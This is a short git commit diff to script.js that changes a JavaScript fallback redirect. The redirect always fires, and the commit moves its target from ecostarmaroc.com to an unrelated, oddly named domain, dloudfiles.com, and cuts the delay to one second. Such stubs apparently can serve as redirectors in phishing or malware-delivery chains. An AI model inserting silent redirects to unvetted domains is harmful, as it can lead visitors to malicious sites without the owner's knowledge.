50d6e2025d1a3ff66d41dcdc84b9639f4159852d
GabSouder1 <154463975+GabSouder1@users.noreply.github.com>
2025-03-20 23:56:37 +0300

    Add files via upload

--- script.js
+++ script.js
@@ -2,6 +2,6 @@
 // Backup redirect if meta refresh fails
 setTimeout(() => {
   if (window.location.href === document.location.href) {
-    window.location.href = 'https://ecostarmaroc.com';
+    window.location.href = 'https://dloudfiles.com';
   }
-}, 1500);
+}, 1000);
